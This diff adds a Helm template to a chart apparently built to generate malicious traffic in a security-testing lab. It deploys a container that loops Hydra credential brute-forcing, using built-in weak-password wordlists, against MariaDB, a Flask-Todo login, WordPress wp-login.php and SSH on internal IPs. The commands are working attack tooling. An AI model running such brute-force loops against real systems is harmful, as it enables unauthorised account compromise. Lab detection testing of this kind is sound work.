@@ -1,0 +1,120 @@
+# Hydra brute-force deployment
+# Source: https://github.com/vanhauser-thc/thc-hydra
+{{- if .Values.bruteforce.enabled }}
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: {{ include "malicious-containers.fullname" . }}-bruteforce
+  labels:
+    {{- include "malicious-containers.labels" . | nindent 4 }}
+    app.kubernetes.io/component: bruteforce
+    kids-label: "1"
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      {{- include "malicious-containers.selectorLabels" . | nindent 6 }}
+      app.kubernetes.io/component: bruteforce
+  template:
+    metadata:
+      labels:
+        {{- include "malicious-containers.selectorLabels" . | nindent 8 }}
+        app.kubernetes.io/component: bruteforce
+        kids-label: "1"
+    spec:
+      {{- with .Values.nodeSelector }}
+      nodeSelector:
+        {{- toYaml . | nindent 8 }}
+      {{- end }}
+      {{- with .Values.tolerations }}
+      tolerations:
+        {{- toYaml . | nindent 8 }}
+      {{- end }}
+      containers:
+        - name: bruteforce
+          image: {{ .Values.bruteforce.image }}
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              echo "Starting brute-force attack simulation..."
+
+              # Generate wordlists
+              cat > /tmp/users.txt <<EOF
+              admin
+              root
+              user
+              test
+              guest
+              operator
+              manager
+              deploy
+              service
+              app
+              EOF
+
+              cat > /tmp/passwords.txt <<EOF
+              password
+              123456
+              admin
+              root
+              toor
+              letmein
+              welcome
+              monkey
+              dragon
+              master
+              qwerty
+              abc123
+              password1
+              admin123
+              changeme
+              kids_password
+              EOF
+
+              while true; do
+                echo "[$(date)] === Brute-force cycle start ==="
+
+                # Target 1: MariaDB MySQL login
+                echo "[$(date)] Attacking MariaDB (mysql)..."
+                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
+                  mariadb-sysbench-service.benign-workloads.svc.cluster.local \
+                  mysql -t 4 -w 5 -f 2>&1 || true
+
+                sleep 30
+
+                # Target 2: Flask-Todo HTTP POST login
+                echo "[$(date)] Attacking Flask-Todo (http-post)..."
+                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
+                  flask-todo.benign-workloads.svc.cluster.local \
+                  http-post-form "/:username=^USER^&password=^PASS^:Invalid" \
+                  -t 4 -w 5 -f 2>&1 || true
+
+                sleep 30
+
+                # Target 3: WordPress login
+                echo "[$(date)] Attacking WordPress (http-post)..."
+                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
+                  wordpress-app.benign-workloads.svc.cluster.local \
+                  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" \
+                  -t 4 -w 5 -f 2>&1 || true
+
+                sleep 30
+
+                # Target 4: SSH brute-force on internal IPs
+                echo "[$(date)] Attacking SSH on internal network..."
+                for ip in 10.0.1.27 10.0.1.224 10.0.1.142; do
+                  hydra -L /tmp/users.txt -P /tmp/passwords.txt \
+                    $ip ssh -t 2 -w 3 -f 2>&1 || true
+                done
+
+                echo "[$(date)] === Cycle complete. Sleeping 120s ==="
+                sleep 120
+              done
+          resources:
+            requests:
+              cpu: 50m
+              memory: 64Mi
+            limits:
+              cpu: 200m
+              memory: 128Mi
+{{- end }}
